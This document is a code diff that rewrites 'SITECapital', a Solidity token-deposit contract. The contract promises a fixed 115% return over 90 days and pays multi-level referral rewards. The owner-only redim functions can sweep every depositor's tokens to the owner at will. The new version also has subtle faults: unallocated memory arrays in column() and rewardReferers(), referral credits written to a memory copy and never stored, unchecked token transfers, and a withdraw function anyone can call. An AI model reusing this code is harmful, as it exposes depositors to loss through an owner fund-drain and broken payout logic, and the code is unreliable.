@@ -1,437 +1,348 @@
-pragma solidity ^0.5.15;
+pragma solidity >=0.8.0;
+// SPDX-License-Identifier: Apache-2.0
 
-import "./SafeMath.sol";
+library SafeMath {
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
 
-contract TRC20_Interface {
-  function allowance(address _owner, address _spender) public view returns (uint remaining);
-  function transferFrom(address _from, address _to, uint _value) public returns (bool);
-  function transfer(address direccion, uint cantidad) public returns (bool);
-  function balanceOf(address who) public view returns (uint256);
-  function decimals() public view returns(uint);
+        uint256 c = a * b;
+        require(c / a == b);
+
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b > 0);
+        uint256 c = a / b;
+
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b <= a);
+        uint256 c = a - b;
+
+        return c;
+    }
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a);
+
+        return c;
+    }
+}
+
+interface ITRC20 {
+    function allowance(
+        address _owner,
+        address _spender
+    ) external view returns (uint256 remaining);
+    function transferFrom(
+        address _from,
+        address _to,
+        uint256 _value
+    ) external returns (bool);
+    function transfer(
+        address direccion,
+        uint256 cantidad
+    ) external returns (bool);
+    function balanceOf(address who) external view returns (uint256);
+    function decimals() external view returns (uint);
 }
 
 contract SITECapital {
-  using SafeMath for uint;
+    using SafeMath for uint256;
 
-  TRC20_Interface USDT_Contract;
-  TRC20_Interface OTRO_Contract;
-
-  struct Deposit {
-    uint porciento;
-    uint tiempo;
-    uint amount;
-    uint at;
-  }
-
-  struct Referer {
-    address myReferer;
-    uint nivel;
-  }
-
-  struct Investor {
-    bool registered;
-    bool recompensa;
-    address sponsor;
-    Referer[] referers;
-    uint balanceRef;
-    uint totalRef;
-    Deposit[] deposits;
-    uint invested;
-    uint paidAt;
-    uint withdrawn;
-  }
-
-  uint public MIN_DEPOSIT = 100*10**8;
-  uint public MAX_DEPOSIT = 11000*10**8;
-
-  uint public MIN_RETIRO = 70*10**8;
-  uint public MAX_RETIRO = 500000*10**8;
-
-  address payable public owner;
-
-  uint[5] public primervez = [30, 10, 0, 0, 0];
-
-  uint[5] public porcientos = [5, 3, 0, 0, 0];
-
-  uint public basePorcientos = 1000;
-  bool public sisReferidos = true;
-
-  uint public dias = 90;
-  uint public porcent = 115;
-  uint public velocidad = 3;
-
-  uint public totalInvestors;
-  uint public totalInvested;
-  uint public totalRefRewards;
-
-
-  mapping (address => Investor) public investors;
-
-  constructor(address _tokenTRC20) public {
-    USDT_Contract = TRC20_Interface(_tokenTRC20);
-    owner = msg.sender;
-    investors[msg.sender].registered = true;
-    investors[msg.sender].recompensa = true;
-    investors[msg.sender].sponsor = address(0);
-
-    totalInvestors++;
-
-  }
-
-  function ChangeTokenUSDT(address _tokenTRC20) public returns (bool){
-
-    require( msg.sender == owner );
-
-    USDT_Contract = TRC20_Interface(_tokenTRC20);
-
-    return true;
-
-  }
-
-  function ChangeTokenOTRO(address _tokenTRC20) public returns (bool){
-
-    require( msg.sender == owner );
-
-    OTRO_Contract = TRC20_Interface(_tokenTRC20);
-
-    return true;
-
-  }
-
-  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
-      return (totalInvestors, totalInvested, totalRefRewards);
-  }
-
-  function InContractSITE() public view returns (uint){
-    return USDT_Contract.balanceOf(address(this));
-  }
-
-  function InContractOTRO() public view returns (uint){
-    return OTRO_Contract.balanceOf(address(this));
-  }
-
-  function InContractTRX() public view returns (uint){
-    return address(this).balance;
-  }
-  
-  function tiempo() public view returns (uint){
-     return dias.mul(86400).div(velocidad);
-  }
-
-  function setPorcientos(uint _value_1, uint _value_2, uint _value_3, uint _value_4, uint _value_5) public returns(uint, uint, uint, uint, uint){
-
-    require( msg.sender == owner );
-
-    porcientos = [_value_1, _value_2, _value_3, _value_4, _value_5];
-
-    return (_value_1, _value_2, _value_3, _value_4, _value_5);
-
-  }
-
-  function setPrimeravezPorcientos(uint _value_1, uint _value_2, uint _value_3, uint _value_4, uint _value_5) public returns(uint, uint, uint, uint, uint){
-
-    require( msg.sender == owner );
-
-    primervez = [_value_1, _value_2, _value_3, _value_4, _value_5];
-
-    return (_value_1, _value_2, _value_3, _value_4, _value_5);
-
-  }
-
-  function setMinimoMaximos(uint _MIN_DEPOSIT, uint _MAX_DEPOSIT, uint _MIN_RETIRO, uint _MAX_RETIRO) public returns(bool){
-
-    require( msg.sender == owner );
-
-    if (_MIN_DEPOSIT != 0){
-      MIN_DEPOSIT = _MIN_DEPOSIT;
-    }
-    if (_MAX_DEPOSIT != 0){
-      MAX_DEPOSIT = _MAX_DEPOSIT;
-    }
-    if (_MIN_RETIRO != 0){
-      MIN_RETIRO = _MIN_RETIRO;
-    }
-    if (_MAX_RETIRO != 0){
-      MAX_RETIRO = _MAX_RETIRO;
+    struct Deposit {
+        uint256 porciento;
+        uint256 tiempo;
+        uint256 amount;
+        uint256 at;
     }
 
-    return true;
+    struct Investor {
+        bool registered;
+        address sponsor;
+        uint256 balanceRef;
+        uint256 totalRef;
+        uint256 invested;
+        uint256 paidAt;
+        uint256 withdrawn;
+    }
 
-  }
+    address public TOKEN;
+    uint256 public MIN_DEPOSIT = 100 * 10 ** 8;
+    uint256 public MAX_DEPOSIT = 11000 * 10 ** 8;
 
-  function setTiempo(uint _dias) public returns(uint){
+    uint256 public MIN_RETIRO = 70 * 10 ** 8;
+    uint256 public MAX_RETIRO = 500000 * 10 ** 8;
 
-    require( msg.sender == owner );
-    dias = _dias;
-    
-    return (_dias);
+    address public owner;
 
-  }
+    uint256[] public primervez = [30, 10, 0, 0, 0];
 
-  function setBase(uint _100) public returns(uint){
+    uint256[] public porcientos = [5, 3, 0, 0, 0];
 
-    require( msg.sender == owner );
-    basePorcientos = _100;
-    
-    return (_100);
+    uint256 public basePorcientos = 1000;
+    bool public sisReferidos = true;
 
-  }
+    uint256 public dias = 90;
+    uint256 public porcent = 115;
 
-  function controlReferidos(bool _true_false) public returns(bool){
+    uint256 public totalInvestors;
+    uint256 public totalInvested;
+    uint256 public totalRefRewards;
 
-    require( msg.sender == owner );
-    sisReferidos = _true_false;
-    
-    return (_true_false);
+    mapping(address => Investor) public investors;
+    mapping(address => Deposit[]) public deposits;
 
-  }
+    constructor(address _tokenTRC20) {
+        TOKEN = _tokenTRC20;
+        owner = msg.sender;
+        investors[msg.sender].registered = true;
+        investors[msg.sender].sponsor = address(0);
 
-  function setRetorno(uint _porcentaje) public returns(uint){
+        totalInvestors++;
+    }
 
-    require( msg.sender == owner );
-    porcent = _porcentaje;
+    function ChangeTokenUSDT(address _tokenTRC20) public returns (bool) {
+        require(msg.sender == owner);
+        TOKEN = _tokenTRC20;
 
-    return (porcent);
+        return true;
+    }
 
-  }
+    function setstate()
+        public
+        view
+        returns (uint256 Investors, uint256 Invested, uint256 RefRewards)
+    {
+        return (totalInvestors, totalInvested, totalRefRewards);
+    }
 
-  function setvelocidad(uint _velocidad) public returns(uint){
+    function InContractSITE() public view returns (uint) {
+        return ITRC20(TOKEN).balanceOf(address(this));
+    }
 
-    require( msg.sender == owner );
-    velocidad = _velocidad;
+    function InContractOTRO(address _token) public view returns (uint) {
+        return ITRC20(_token).balanceOf(address(this));
+    }
 
-    return (velocidad);
+    function InContractTRX() public view returns (uint) {
+        return address(this).balance;
+    }
 
-  }
+    function tiempo() public view returns (uint) {
+        return dias.mul(86400);
+    }
 
+    function setPorcientos(uint256[] calldata _values) public {
+        require(msg.sender == owner);
+        porcientos = _values;
+    }
 
-  function column (address yo) public view returns(address[5] memory res) {
+    function setPrimeravezPorcientos(uint256[] calldata _values) public {
+        require(msg.sender == owner);
+        primervez = _values;
+    }
 
-    res[0] = investors[yo].sponsor;
-    yo = investors[yo].sponsor;
-    res[1] = investors[yo].sponsor;
-    yo = investors[yo].sponsor;
-    res[2] = investors[yo].sponsor;
-    yo = investors[yo].sponsor;
-    res[3] = investors[yo].sponsor;
-    yo = investors[yo].sponsor;
-    res[4] = investors[yo].sponsor;
-    yo = investors[yo].sponsor;
+    function setMinimoMaximos(
+        uint256 _MIN_DEPOSIT,
+        uint256 _MAX_DEPOSIT,
+        uint256 _MIN_RETIRO,
+        uint256 _MAX_RETIRO
+    ) public {
+        require(msg.sender == owner);
 
-    return res;
-  }
-
-  function rewardPrimervez(address yo, uint amount) internal {
-
-    address[5] memory referi = column(yo);
-    uint[5] memory a;
-    uint[5] memory b;
-
-    for (uint i = 0; i < 5; i++) {
-
-      Investor storage usuario = investors[referi[i]];
-      if (usuario.registered && primervez[i] != 0 && usuario.recompensa){
-        if ( referi[i] != address(0) ) {
-
-          b[i] = primervez[i];
-          a[i] = amount.mul(b[i]).div(basePorcientos);
-
-          usuario.balanceRef += a[i];
-          usuario.totalRef += a[i];
-          totalRefRewards += a[i];
-
-        }else{
-
-          break;
+        if (_MIN_DEPOSIT != 0) {
+            MIN_DEPOSIT = _MIN_DEPOSIT;
         }
-      }
-    }
-
-
-  }
-
-  function rewardReferers(address yo, uint amount) internal {
-
-    address[5] memory referi = column(yo);
-    uint[5] memory a;
-    uint[5] memory b;
-
-    for (uint i = 0; i < 5; i++) {
-
-      Investor storage usuario = investors[referi[i]];
-      if (usuario.registered && porcientos[i] != 0 && usuario.recompensa){
-        if ( referi[i] != address(0) ) {
-
-          b[i] = porcientos[i];
-          a[i] = amount.mul(b[i]).div(basePorcientos);
-
-          usuario.balanceRef += a[i];
-          usuario.totalRef += a[i];
-          totalRefRewards += a[i];
-
-        }else{
-          break;
+        if (_MAX_DEPOSIT != 0) {
+            MAX_DEPOSIT = _MAX_DEPOSIT;
         }
-      }
+        if (_MIN_RETIRO != 0) {
+            MIN_RETIRO = _MIN_RETIRO;
+        }
+        if (_MAX_RETIRO != 0) {
+            MAX_RETIRO = _MAX_RETIRO;
+        }
     }
 
+    function setTiempo(uint256 _dias) public returns (uint) {
+        require(msg.sender == owner);
+        dias = _dias;
 
-  }
-
-  function deposit(uint _value, address _sponsor) public {
-
-    Investor storage usuario = investors[msg.sender];
-
-    require(_value >= MIN_DEPOSIT, "Minimo de deposito alcanzado");
-    require(_value <= MAX_DEPOSIT, "Maximo de deposito alcanzado");
-    require(usuario.invested+_value <= MAX_DEPOSIT, "Maximo de deposito alcanzado");
-
-    require( USDT_Contract.allowance(msg.sender, address(this)) >= _value, "aprovado insuficiente");
-    require( USDT_Contract.transferFrom(msg.sender, address(this), _value), "saldo insuficiente" );
-
-    if (!usuario.registered){
-
-      usuario.registered = true;
-      usuario.recompensa = true;
-      usuario.sponsor = _sponsor;
-      if (_sponsor != address(0) && sisReferidos ){
-        rewardPrimervez(msg.sender, _value);
-      }
-      
-      totalInvestors++;
-
-    }else{
-
-      if (usuario.sponsor != address(0) && sisReferidos ){
-        rewardReferers(msg.sender, _value);
-      }
-
+        return (_dias);
     }
 
-    usuario.deposits.push(Deposit(porcent, tiempo(), _value, block.number));
+    function setBase(uint256 _100) public returns (uint) {
+        require(msg.sender == owner);
+        basePorcientos = _100;
 
-    usuario.invested += _value;
-    totalInvested += _value;
-
-  }
-
-
-  function withdrawable(address any_user) public view returns (uint amount) {
-    Investor storage investor = investors[any_user];
-
-    for (uint i = 0; i < investor.deposits.length; i++) {
-      Deposit storage dep = investor.deposits[i];
-      uint tiempoD = dep.tiempo;
-      uint porcientD = dep.porciento;
-
-      uint finish = dep.at + tiempoD;
-      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
-      uint till = block.number > finish ? finish : block.number;
-
-      if (since < till) {
-        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
-      }
+        return (_100);
     }
-  }
 
+    function controlReferidos(bool _true_false) public returns (bool) {
+        require(msg.sender == owner);
+        sisReferidos = _true_false;
 
-  function MYwithdrawable() public view returns (uint amount) {
-    Investor storage investor = investors[msg.sender];
-
-    for (uint i = 0; i < investor.deposits.length; i++) {
-      Deposit storage dep = investor.deposits[i];
-      uint tiempoD = dep.tiempo;
-      uint porcientD = dep.porciento;
-
-      uint finish = dep.at + tiempoD;
-      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
-      uint till = block.number > finish ? finish : block.number;
-
-      if (since < till) {
-        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
-      }
+        return (_true_false);
     }
-  }
 
-  function profit() internal returns (uint) {
-    Investor storage investor = investors[msg.sender];
+    function setRetorno(uint256 _porcentaje) public returns (uint) {
+        require(msg.sender == owner);
+        porcent = _porcentaje;
 
-    uint amount = withdrawable(msg.sender);
+        return (porcent);
+    }
 
-    amount += investor.balanceRef;
-    investor.balanceRef = 0;
+    function column(
+        address _from,
+        uint256 _lengt
+    ) public view returns (address[] memory res) {
+        for (uint256 index = 0; index < _lengt; index++) {
+            res[index] = investors[_from].sponsor;
+            _from = investors[_from].sponsor;
+        }
 
-    investor.paidAt = block.number;
+        return res;
+    }
 
-    return amount;
+    function rewardReferers(
+        address from,
+        uint256 amount,
+        uint256[] memory array
+    ) internal {
+        Investor memory usuario;
+        address[] memory referi = column(from, array.length);
+        uint256[] memory a;
+        uint256[] memory b;
 
-  }
+        for (uint256 i = 0; i < array.length; i++) {
+            usuario = investors[referi[i]];
+            if (usuario.registered && porcientos[i] != 0) {
+                if (referi[i] != address(0)) {
+                    b[i] = porcientos[i];
+                    a[i] = amount.mul(b[i]).div(basePorcientos);
 
+                    usuario.balanceRef += a[i];
+                    usuario.totalRef += a[i];
+                    totalRefRewards += a[i];
+                } else {
+                    break;
+                }
+            }
+        }
+    }
 
-  function withdraw() external {
+    function deposit(uint256 _value, address _sponsor) public {
+        Investor storage usuario = investors[msg.sender];
 
-    Investor storage usuario = investors[msg.sender];
+        require(_value >= MIN_DEPOSIT, "Minimo de deposito alcanzado");
+        require(_value <= MAX_DEPOSIT, "Maximo de deposito alcanzado");
+        require(
+            usuario.invested + _value <= MAX_DEPOSIT,
+            "Maximo de deposito alcanzado"
+        );
 
-    uint amount = withdrawable(msg.sender);
-    amount = amount+usuario.balanceRef;
+        ITRC20(TOKEN).transferFrom(msg.sender, address(this), _value);
 
-    require ( USDT_Contract.balanceOf(address(this)) >= amount, "The contract has no balance");
-    require ( amount >= MIN_RETIRO, "The minimum withdrawal limit reached");
-    require ( amount <= MAX_RETIRO, "The maximum withdrawal limit reached");
-    require ( usuario.withdrawn+amount <= MAX_RETIRO, "The maximum withdrawal limit reached");
+        if (!usuario.registered) {
+            usuario.registered = true;
+            usuario.sponsor = _sponsor;
+            if (_sponsor != address(0) && sisReferidos) {
+                rewardReferers(msg.sender, _value, primervez);
+            }
 
-    require ( USDT_Contract.transfer(msg.sender,amount), "whitdrawl Fail" );
+            totalInvestors++;
+        } else {
+            if (usuario.sponsor != address(0) && sisReferidos) {
+                rewardReferers(msg.sender, _value, porcientos);
+            }
+        }
 
-    profit();
+        deposits[msg.sender].push(
+            Deposit(porcent, tiempo(), _value, block.timestamp)
+        );
 
-    usuario.withdrawn += amount;
+        usuario.invested += _value;
+        totalInvested += _value;
+    }
 
-  }
+    function withdrawable(address _user) public view returns (uint256 amount) {
+        Investor memory investor = investors[_user];
+        Deposit memory dep;
+        uint256 since;
+        uint256 till;
 
-  function redimSITE01() public returns (uint256){
-    require(msg.sender == owner);
+        for (uint256 i = 0; i < deposits[_user].length; i++) {
+            dep = deposits[_user][i];
 
-    uint256 valor = USDT_Contract.balanceOf(address(this));
+            since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
+            till = block.timestamp > dep.at + dep.tiempo
+                ? dep.at + dep.tiempo
+                : block.timestamp;
 
-    USDT_Contract.transfer(owner, valor);
+            if (since < till) {
+                amount +=
+                    (dep.amount * (till - since) * dep.porciento) /
+                    dep.tiempo /
+                    100;
+            }
+        }
+    }
 
-    return valor;
-  }
+    function withdraw(address _user) external {
+        uint256 amount = withdrawable(_user) + investors[_user].balanceRef;
 
-  function redimSITE02(uint _value) public returns (uint256) {
+        require(amount >= MIN_RETIRO, "The minimum withdrawal limit reached");
+        require(amount <= MAX_RETIRO, "The maximum withdrawal limit reached");
+        require(
+            investors[_user].withdrawn + amount <= MAX_RETIRO,
+            "The maximum withdrawal limit reached"
+        );
 
-    require ( msg.sender == owner, "only owner");
+        ITRC20(TOKEN).transfer(_user, amount);
 
-    require ( USDT_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");
+        investors[_user].balanceRef = 0;
+        investors[_user].paidAt = block.timestamp;
+        investors[_user].withdrawn += amount;
+    }
 
-    USDT_Contract.transfer(owner, _value);
+    function redimSITE01() public {
+        require(msg.sender == owner);
 
-    return _value;
+        ITRC20(TOKEN).transfer(owner, ITRC20(TOKEN).balanceOf(address(this)));
+    }
 
-  }
+    function redimSITE02(uint256 _value) public returns (uint256) {
+        require(msg.sender == owner, "only owner");
 
-  function redimOTRO01() public returns (uint256){
-    require(msg.sender == owner);
+        ITRC20(TOKEN).transfer(owner, _value);
 
-    uint256 valor = OTRO_Contract.balanceOf(address(this));
+        return _value;
+    }
 
-    OTRO_Contract.transfer(owner, valor);
+    function redimOTRO01(address _token) public {
+        require(msg.sender == owner);
 
-    return valor;
-  }
+        ITRC20(_token).transfer(owner, ITRC20(_token).balanceOf(address(this)));
+    }
 
-  function redimOTRO02(uint _value) public returns (uint256){
+    function redimOTRO02(
+        uint256 _value,
+        address _token
+    ) public returns (uint256) {
+        require(msg.sender == owner, "only owner");
 
-    require ( msg.sender == owner, "only owner");
+        ITRC20(_token).transfer(owner, _value);
 
-    require ( OTRO_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");
+        return _value;
+    }
 
-    OTRO_Contract.transfer(owner, _value);
-
-    return _value;
-
-  }
-
-  function () external payable {}
-
+    fallback() external payable {}
+    receive() external payable {}
 }
